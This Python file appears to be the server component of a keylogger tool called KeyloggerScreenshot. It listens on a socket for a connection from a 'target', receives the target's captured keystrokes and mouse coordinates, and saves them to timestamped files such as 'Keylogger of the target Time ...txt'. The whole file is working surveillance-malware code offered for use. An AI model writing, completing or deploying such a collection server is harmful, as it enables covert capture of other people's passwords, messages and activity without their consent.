import time
import sys
import socket
import os
import BetterPrinting as bp
from .Server_photos import ServerPhotos
from .Port_data import Ports
from .Simulation_code import Simulation

class ServerKeylogger:
    # This is the class of the Server. Both Server should not be in the same file
    def __init__(self, ip, port, simulater=False):
        self.ip = ip
        self.port = port
        self.simulater = simulater
        self.new_data = None
        self.check_under = False

    def message(self, real_data):
        # To know if the server has some issues
        for zeichen in real_data:
            if "{" == zeichen:
                # "{" this detects if a space or a tab is in full_msg
                self.new_data = real_data.replace("{", " ")
                self.check_under = True

        if self.check_under is False:
            self.new_data = real_data

        print(self.check_under)
        # The data is being stored in full_msg
        bp.color(f"Text of target: {self.new_data}", "magenta")
        zeit = time.strftime("%H-%M-%S-%Y")
        # This is the time the data has arrived
        if self.new_data != "":
            with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
                file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{self.new_data}")

        else:
            bp.color("The Target didn't type something...", "magenta")

    def check_double(self):  # This function is here to check if there are more files with the same name
        dir = os.listdir()
        check = [each_name for each_name in dir if "mouseInfo" in each_name]
        if len(check) == 0:
            filename = "mouseInfoLog.txt"
        else:
            amount = len(check) + 1
            filename = f"mouseInfoLog {amount}.txt"

        return filename

    def start(self):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((self.ip, self.port))
            server.listen(1000)

            bp.color("Waiting for connection....", "magenta")
            clientsocket, ipaddress = server.accept()
            # Data is in clientsocket and the ip-address is obviously in "ipaddress"
            bp.color(f"\nConnection has been established with {ipaddress}", "magenta")

            full_msg = ServerPhotos.get_data(self, clientsocket, "r", 8192)
            if ")]" in full_msg:
                # Checks if the coordinates are there
                cord = full_msg.split(")]")
                new_cor = cord[0] + ")]"
                direct = os.listdir()

                filename = self.check_double()
                with open(filename, "a+") as file:
                    # The coordinates will be stored in "mouseInfoLog.txt"
                    file.write(f"These are the coordinates of the target \n{new_cor}")
                bp.color("The coordinates of the target have been saved to your directory", "magenta")

                if cord[1] == "":
                    bp.color("The target hasn't typed anything", "magenta")
                else:
                    self.message(cord[1])

            elif "{" in full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in full_msg:
                # This checks if the target hasn't clicked something and if there is still some data
                full_msg = full_msg.replace("[]", "")
                bp.color("The target hasn't clicked anything", "magenta")
                self.message(full_msg)

            elif "[]" == full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in full_msg:
                # Checks if nothing has typed or clicked
                bp.color("The target hasn't typed and clicked anything", "magenta")

            else:
                spalten = full_msg.split("***%§§)§§%")
                # This splits the data with the special code
                if spalten[1] != "":
                    # If the data is not empty
                    text = spalten[1]
                    for zeichen in text:
                        if "{" == zeichen:
                            text = text.replace("{", " ")
                    bp.color(f"Text of target: {text}", "magenta")
                    zeit = time.strftime("%H-%M-%S-%Y")
                    # This is the time the data has arrived
                    with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
                        file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{text}")
                        # That means data will appear even if the connection isn't stabled
                else:
                    bp.color("The target hasn't written something in the meanwhile", "magenta")

                bp.color("\nTHE CONNECTION HAS BEEN INTERRUPTED", "magenta")
                bp.color("THE SERVER WILL BE DESTROYED\n", "magenta")
                os._exit(0)
                # This shuts down the server


            if self.simulater is True:
                print("Simulation will come in 10 seconds!!!")
                time.sleep(10)
                start = input("Do you want to start y/n?: ")
                if start not in ["y", "yes"]:
                    print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
                    os._exit(0)

                Simulation.start_simulation()

        except OSError:
            working_port = Ports.get_working_ports()
            if str(self.port) in working_port:
                bp.color(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERKEYLOGGER. PORT NUMBER: {self.port} already in use", "magenta")
                os._exit(0)
